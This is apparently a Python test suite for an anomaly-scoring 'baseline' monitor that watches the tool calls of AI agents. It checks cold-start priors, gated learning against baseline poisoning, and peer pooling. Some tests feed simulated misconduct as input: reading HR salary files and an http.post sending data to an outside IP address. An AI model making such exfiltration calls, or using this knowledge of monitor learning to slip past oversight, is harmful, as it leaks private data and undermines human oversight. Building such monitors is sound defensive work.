import unittest
from app.models.events import ToolCallRequest
from helpers import make_services


def call(svc, agent, tool, args=None):
    return svc.gateway.handle_tool_call(ToolCallRequest(agent, tool, args or {}))


class BaselineColdStartTests(unittest.TestCase):
    def setUp(self):
        self.s = make_services()
        self.s.gateway.register_agent("a", "procurement_agent")

    def test_new_agent_typical_start_is_unsurprising(self):
        d = call(self.s, "a", "doc.read", {"path": "supplier/quote_1.pdf"})
        self.assertLess(d.lens["baseline"]["score"], 0.15)
        self.assertEqual(d.lens["baseline"]["details"]["own_weight"], 0.0)   # pure prior on day 0

    def test_tool_outside_the_contract_is_surprising_from_action_one(self):
        d = call(self.s, "a", "hr_files.read", {"path": "hr/salaries_2026.xlsx"})
        self.assertGreater(d.lens["baseline"]["score"], 0.9)
        self.assertEqual(d.lens["baseline"]["details"]["learned_events"], 0)

    def test_in_contract_but_untypical_order_is_only_mildly_unusual_on_day_zero(self):
        call(self.s, "a", "purchase.create_request", {"sku": "SKU-100", "qty": 1})
        d = call(self.s, "a", "doc.read", {"path": "supplier/quote_1.pdf"})   # not in a typical sequence
        self.assertLess(d.lens["baseline"]["score"], 0.35)
        self.assertEqual(d.band, "LOW")

    def test_own_history_takes_over_from_the_prior(self):
        m = self.s.baseline
        contract = self.s.contracts.get("procurement_agent")
        before = m.probability("a", contract, "supplier_api.get_price")
        for _ in range(60):
            call(self.s, "a", "doc.read", {"path": "supplier/quote_1.pdf"})
            call(self.s, "a", "supplier_api.get_price", {"sku": "SKU-100"})
        m.model("a", "procurement_agent").prev = "doc.read"
        after = m.probability("a", contract, "supplier_api.get_price")
        self.assertEqual(before["w"], 0.0)
        self.assertGreater(after["w"], 0.7)                  # own history now carries most of the weight
        self.assertGreater(after["p"], before["p"] + 0.2)    # and the transition became far more expected
        self.assertGreater(after["p"], 0.8)                  # (kept below 1.0 on purpose: the prior never fully vanishes)

    def test_learns_only_from_events_judged_low(self):
        call(self.s, "a", "hr_files.read", {"path": "hr/salaries_2026.xlsx"})
        call(self.s, "a", "http.post", {"url": "http://203.0.113.9/x", "body": "z"})
        summary = self.s.baseline.summary("a")
        self.assertEqual(summary["learned_events"], 0)
        self.assertEqual(summary["transitions"], [])

    def test_learn_gate_stops_poisoned_learning(self):
        """Repeating an attack must not teach the baseline it is normal."""
        gated, ungated = make_services(), make_services(learn_gate=False)
        scores = {}
        for name, svc in (("gated", gated), ("ungated", ungated)):
            svc.gateway.register_agent("a", "procurement_agent")
            for _ in range(30):
                d = call(svc, "a", "hr_files.read", {"path": "hr/salaries_2026.xlsx"})
            scores[name] = d.lens["baseline"]["score"]
        self.assertGreater(scores["gated"], 0.9)        # still screaming after 30 repeats
        self.assertLess(scores["ungated"], 0.2)         # an ungated model has been taught it is normal

    def test_sensitivity_zscore_flags_unusual_data_even_with_a_normal_tool(self):
        for _ in range(25):
            call(self.s, "a", "doc.read", {"path": "supplier/quote_1.pdf"})
            call(self.s, "a", "supplier_api.get_price", {"sku": "SKU-100"})
        d = call(self.s, "a", "doc.read", {"path": "payroll/ledger.csv"})      # same tool, very different data
        det = d.lens["baseline"]["details"]
        self.assertGreaterEqual(det["sensitivity_z"], 3.5)
        self.assertGreater(d.lens["baseline"]["score"], 0.5)

    def test_peer_pooling_helps_a_brand_new_agent(self):
        veteran_world = make_services()
        lonely_world = make_services()
        for svc in (veteran_world, lonely_world):
            svc.gateway.register_agent("new", "procurement_agent")
        veteran_world.gateway.register_agent("vet", "procurement_agent")
        for _ in range(60):                                  # peers do create_request -> doc.read a lot
            call(veteran_world, "vet", "purchase.create_request", {"sku": "SKU-100", "qty": 1})
            call(veteran_world, "vet", "doc.read", {"path": "supplier/quote_1.pdf"})
        probs = {}
        for name, svc in (("peers", veteran_world), ("alone", lonely_world)):
            call(svc, "new", "purchase.create_request", {"sku": "SKU-100", "qty": 1})   # new agent: prev = create_request
            probs[name] = svc.baseline.probability("new", svc.contracts.get("procurement_agent"), "doc.read")
        self.assertGreater(probs["peers"]["peer_obs"], 20)
        self.assertEqual(probs["alone"]["peer_obs"], 0)
        self.assertGreater(probs["peers"]["p"], probs["alone"]["p"])

    def test_disabling_the_lens_removes_it_from_results(self):
        svc = make_services(enable_baseline=False, enable_drift=False)
        svc.gateway.register_agent("a", "procurement_agent")
        d = call(svc, "a", "supplier_api.get_price", {"sku": "SKU-100"})
        self.assertNotIn("baseline", d.lens)
        self.assertNotIn("drift", d.lens)


if __name__ == "__main__":
    unittest.main()
